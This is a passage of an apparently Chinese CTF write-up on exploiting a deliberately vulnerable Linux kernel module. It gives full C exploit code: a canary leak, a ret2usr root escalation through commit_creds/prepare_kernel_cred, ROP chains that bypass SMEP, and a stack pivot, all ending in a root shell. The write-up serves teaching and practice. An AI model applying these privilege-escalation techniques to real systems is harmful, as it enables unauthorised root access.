class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -kernel ./vmlinux \</span><br><span class="line">    -initrd ./initrd.modified.cpio \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append &quot;console=ttyS0 nokpti quiet panic=1 nokaslr&quot; \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>canary 和 tmp 的距离如下 memcpy 不是 0 截断 rdx 是由 size 给到的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-00000000000000</span>A0 tmp             dd <span class="number">32</span> dup(?)</span><br><span class="line"><span class="number">-0000000000000020</span> anonymous_0     dq ?</span><br></pre></td></tr></table></figure><p>断到目标位置 截取 canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">●  <span class="number">0xffffffffc0000046</span>                  mov    rax, QWORD PTR gs:<span class="number">0x28</span></span><br><span class="line"> → <span class="number">0xffffffffc000004f</span>                  mov    QWORD PTR [rbp<span class="number">-0x18</span>], rax</span><br><span class="line"></span><br><span class="line">gef➤  p/x $rax</span><br><span class="line">$<span class="number">1</span> = <span class="number">0xbced0c8930859900</span></span><br></pre></td></tr></table></figure><p>泄漏出了 canary 后 查看 write 的汇编 和 useland 不同的是 这里弹了三个寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text.hackme_write:<span class="number">00000000000000</span>A8                 pop     rbx</span><br><span class="line">.text.hackme_write:<span class="number">00000000000000</span>A9                 pop     r12</span><br><span class="line">.text.hackme_write:<span class="number">00000000000000</span>AB                 pop     rbp</span><br><span class="line">.text.hackme_write:<span class="number">00000000000000</span>AC                 retn</span><br></pre></td></tr></table></figure><p>至于这个偏移可以打入特殊值断点调试<br>最终要调用 swapgs 和 iretq<br> 栈上要布局五个寄存器 (向下面这样)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROP[i++] = a[SWAPGS_POP_RET];</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = a[IRETQ];</span><br><span class="line">ROP[i++] = (u64)getshell;</span><br><span class="line">ROP[i++] = user_cs;</span><br><span class="line">ROP[i++] = user_flags;</span><br><span class="line">ROP[i++] = user_sp;</span><br><span class="line">ROP[i++] = user_ss;</span><br></pre></td></tr></table></figure><p>由于这题十分奇怪 各个操作的基址不停的在变化 所以需要通过别的途径来获取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/head.h&quot;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> write_addr, read_addr;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getOpAddr</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    Info(<span class="string">&quot;root get operation addr&quot;</span>);</span><br><span class="line">    FILE * stream = popen(<span class="string">&quot;cat /proc/kallsyms | grep hackme_write | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    assert(stream != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    fread(buf, <span class="number">0x10</span>, <span class="number">1</span> ,stream);</span><br><span class="line">    write_addr = strtoul(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">    Info(<span class="string">&quot;write_addr = 0x%lx&quot;</span>, write_addr);</span><br><span class="line"></span><br><span class="line">    stream = popen(<span class="string">&quot;cat /proc/kallsyms | grep hackme_read | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    assert(stream != <span class="literal">NULL</span>);</span><br><span class="line">    fread(buf, <span class="number">0x10</span>, <span class="number">1</span> ,stream);</span><br><span class="line">    read_addr = strtoul(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">    Info(<span class="string">&quot;read_addr = 0x%lx&quot;</span>, read_addr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  getOpAddr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后栈溢出的操作比较简单</p><ul><li>劫持 rip 到用户函数 先 cc (pkc) 提权</li><li>再跳转到 布局用户态寄存器 swapgs + iretq</li><li>上述操作的时候可以劫持 rip 返回 getShell 函数</li></ul><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line">u64 write_addr, read_addr;</span><br><span class="line">u64 user_cs,user_ss,user_sp,user_rflags;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveState</span><span class="params">()</span>&#123;</span><br><span class="line">  __asm__ __volatile__ (</span><br><span class="line">    <span class="string">&quot;mov %cs, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov %ss, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">  );</span><br><span class="line">  Done(<span class="string">&quot;saveState&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    Panic(<span class="string">&quot;open_dev() failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  Done(<span class="string">&quot;open_dev()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write to kernel</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">wtk</span><span class="params">(<span class="type">char</span> *buf, u64 size)</span>&#123;</span><br><span class="line">  Info(<span class="string">&quot;wtk start&quot;</span>);</span><br><span class="line">  write(fd, buf, size);</span><br><span class="line">  Done(<span class="string">&quot;wtk&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// read from kernel</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rfk</span><span class="params">(<span class="type">char</span> *buf, u64 size)</span>&#123;</span><br><span class="line">  Info(<span class="string">&quot;rfk start&quot;</span>);</span><br><span class="line">  read(fd, buf, size);</span><br><span class="line">  Done(<span class="string">&quot;rfk&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getOpAddr</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    Info(<span class="string">&quot;root get operation addr&quot;</span>);</span><br><span class="line">    FILE * stream = popen(<span class="string">&quot;cat /proc/kallsyms | grep hackme_write | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    assert(stream != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    fread(buf, <span class="number">0x10</span>, <span class="number">1</span> ,stream);</span><br><span class="line">    write_addr = strtoul(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">    Info(<span class="string">&quot;write_addr = 0x%lx&quot;</span>, write_addr);</span><br><span class="line"></span><br><span class="line">    stream = popen(<span class="string">&quot;cat /proc/kallsyms | grep hackme_read | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    assert(stream != <span class="literal">NULL</span>);</span><br><span class="line">    fread(buf, <span class="number">0x10</span>, <span class="number">1</span> ,stream);</span><br><span class="line">    read_addr = strtoul(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">    Info(<span class="string">&quot;read_addr = 0x%lx&quot;</span>, read_addr);</span><br><span class="line">  &#125;</span><br><span class="line">  Done(<span class="string">&quot;getOpAddr&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    Info(<span class="string">&quot;get shell now&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    Panic(<span class="string">&quot;getShell failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">u64 pkc = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line">u64 cc = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line">u64 sh = (u64)getShell;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span>&#123;</span><br><span class="line">  (* (<span class="type">int</span> *(*)(<span class="type">void</span> *))cc)((* (<span class="type">void</span> *(*)(<span class="type">void</span> *))pkc)(<span class="literal">NULL</span>));</span><br><span class="line">  ret2usr();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ret2usr</span><span class="params">()</span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, sh;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">    <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  open_dev();</span><br><span class="line">  <span class="comment">// getOpAddr();</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x80</span>];</span><br><span class="line">  <span class="type">char</span> store[<span class="number">0x100</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;\xff&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">  wtk(buf, <span class="number">0x80</span>);</span><br><span class="line">  rfk(store,<span class="number">0x90</span>);</span><br><span class="line">  u64 *ptr = store;</span><br><span class="line">  Dbg(<span class="string">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class="line">  Info(<span class="string">&quot;canary is 0x%lx&quot;</span>, ptr[<span class="number">2</span>]);</span><br><span class="line">  u64 canary = ptr[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// wtk(buf, 0x10);</span></span><br><span class="line">  u64 payload[<span class="number">50</span>];</span><br><span class="line">  <span class="type">int</span> off = <span class="number">16</span>;</span><br><span class="line">  saveState();</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = getRoot;</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="增加smep"><a class="markdownIt-Anchor" href="#增加smep">#</a> 增加 SMEP</h1><h2 id="rop"><a class="markdownIt-Anchor" href="#rop">#</a> ROP</h2><p>开了 SMEP 就要 ROP 了<br>这是高版本的内核 没有 cr4 相关的 gadget 了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ uname -r</span><br><span class="line">5.9.0-rc6+</span><br></pre></td></tr></table></figure><p>只能纯走 ROP 也就是 ROP 里 cc (pkc) 然后 swapgs 和 iretq<br> 所以需要找类似 <code>mov rdi, rax</code>  的 gadget  或者 xchg</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -j .text -d ./vmlinux | grep iretq | head -3</span><br></pre></td></tr></table></figure><ul><li>-j, --section=NAME             Only display information for section NAME</li><li>-d, --disassemble        Display assembler contents of executable sections<br> 用 j 可以指定特殊的节</li></ul><p>就是 ROPgadget 找出来的 gadget 不是全在可执行区域 要找半天 有些还找不到<br>如果 gdb 里看到 int3 就是不可执行区域了</p><p>这里本来试了好多 gadgets 结果都因为不可执行没法用 最后只能用作者的<br>注意到第一个 cmp 只是为了标记 test 后的 flag 位（cmp 和 test 都标记 zf）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  open_dev();</span><br><span class="line">  <span class="comment">// getOpAddr();</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x80</span>];</span><br><span class="line">  <span class="type">char</span> store[<span class="number">0x100</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;\xff&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">  wtk(buf, <span class="number">0x80</span>);</span><br><span class="line">  rfk(store,<span class="number">0x90</span>);</span><br><span class="line">  u64 *ptr = store;</span><br><span class="line">  Dbg(<span class="string">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class="line">  Info(<span class="string">&quot;canary is 0x%lx&quot;</span>, ptr[<span class="number">2</span>]);</span><br><span class="line">  u64 canary = ptr[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// wtk(buf, 0x10);</span></span><br><span class="line">  u64 payload[<span class="number">50</span>];</span><br><span class="line">  <span class="type">int</span> off = <span class="number">16</span>;</span><br><span class="line">  u64 kernel_base              = <span class="number">0xffffffff80000000</span>;</span><br><span class="line">  u64 pop_rdx_ret              = <span class="number">0xffffffff81007616</span>; <span class="comment">// pop rdx ; ret</span></span><br><span class="line">  u64 cmp_rdx_jne_pop2_ret     = <span class="number">0xffffffff81964cc4</span>; <span class="comment">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class="line">  u64 mov_rdi_rax_jne_pop2_ret = <span class="number">0xffffffff8166fea3</span>; <span class="comment">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class="line">  u64 pop_rdi_ret              = <span class="number">0xffffffff81006370</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">  u64 swapgs_pop1_ret          = <span class="number">0xffffffff8100a55f</span>; <span class="comment">// not found </span></span><br><span class="line">  u64 iretq                    = <span class="number">0xffffffff8100c0d9</span>; <span class="comment">// iretq</span></span><br><span class="line">  saveState();</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = pop_rdi_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = pkc;</span><br><span class="line">  payload[off++] = pop_rdx_ret;</span><br><span class="line">  payload[off++] = <span class="number">8</span>;</span><br><span class="line">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class="comment">// make test branch not reach</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = cc;</span><br><span class="line">  payload[off++] = swapgs_pop1_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = iretq;</span><br><span class="line">  payload[off++] = getShell;</span><br><span class="line">  payload[off++] = user_cs;</span><br><span class="line">  payload[off++] = user_rflags;</span><br><span class="line">  payload[off++] = user_sp;</span><br><span class="line">  payload[off++] = user_ss;</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="stack-pivot"><a class="markdownIt-Anchor" href="#stack-pivot">#</a> Stack Pivot</h2><p>基本按照博客思路 copy 一遍（<br>首先找到一个能移动一个常数给 esp 的（给 esp 是因为到用户空间 高位会清零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov_esp_pop2_ret = <span class="number">0xffffffff8196f56a</span>; <span class="comment">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br></pre></td></tr></table></figure><p>然后就是 mmap 开内存到上面 mov 给 esp 增长的地方<br>主要注意一点 因为 rsp 可增可见 所以上下的偏移都要留足<br>然后记得都写点内容触发下换页 免得出现中断又切回内核了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">u64 kernel_base              = <span class="number">0xffffffff80000000</span>;</span><br><span class="line">u64 pop_rdx_ret              = <span class="number">0xffffffff81007616</span>; <span class="comment">// pop rdx ; ret</span></span><br><span class="line">u64 cmp_rdx_jne_pop2_ret     = <span class="number">0xffffffff81964cc4</span>; <span class="comment">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class="line">u64 mov_rdi_rax_jne_pop2_ret = <span class="number">0xffffffff8166fea3</span>; <span class="comment">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class="line">u64 pop_rdi_ret              = <span class="number">0xffffffff81006370</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">u64 swapgs_pop1_ret          = <span class="number">0xffffffff8100a55f</span>; <span class="comment">// not found </span></span><br><span class="line">u64 iretq                    = <span class="number">0xffffffff8100c0d9</span>; <span class="comment">// iretq</span></span><br><span class="line">u64 mov_esp_pop2_ret         = <span class="number">0xffffffff8196f56a</span>; <span class="comment">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">StackPivot</span><span class="params">(u64 canary)</span>&#123;</span><br><span class="line">  u64 *p = mmap(</span><br><span class="line">    (<span class="type">void</span> *)<span class="number">0x5b000000</span> - <span class="number">0x1000</span>, <span class="number">0x2000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, </span><br><span class="line">    MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span></span><br><span class="line">  );</span><br><span class="line">  u64 off = <span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">  p[<span class="number">1</span>   ] = <span class="number">0xdeedbeaf</span>;</span><br><span class="line">  p[off++] = <span class="number">0</span>;<span class="comment">// dummy</span></span><br><span class="line">  p[off++] = <span class="number">0</span>;<span class="comment">// dummy</span></span><br><span class="line">  p[off++] = pop_rdi_ret;</span><br><span class="line">  p[off++] = <span class="number">0</span>;</span><br><span class="line">  p[off++] = pkc;</span><br><span class="line">  p[off++] = pop_rdx_ret;</span><br><span class="line">  p[off++] = <span class="number">8</span>;</span><br><span class="line">  p[off++] = cmp_rdx_jne_pop2_ret;<span class="comment">// make test branch not reach</span></span><br><span class="line">  p[off++] = <span class="number">0</span>;</span><br><span class="line">  p[off++] = <span class="number">0</span>;</span><br><span class="line">  p[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class="line">  p[off++] = <span class="number">0</span>;</span><br><span class="line">  p[off++] = <span class="number">0</span>;</span><br><span class="line">  p[off++] = cc;</span><br><span class="line">  p[off++] = swapgs_pop1_ret;</span><br><span class="line">  p[off++] = <span class="number">0</span>;</span><br><span class="line">  p[off++] = iretq;</span><br><span class="line">  p[off++] = getShell;</span><br><span class="line">  p[off++] = user_cs;</span><br><span class="line">  p[off++] = user_rflags;</span><br><span class="line">  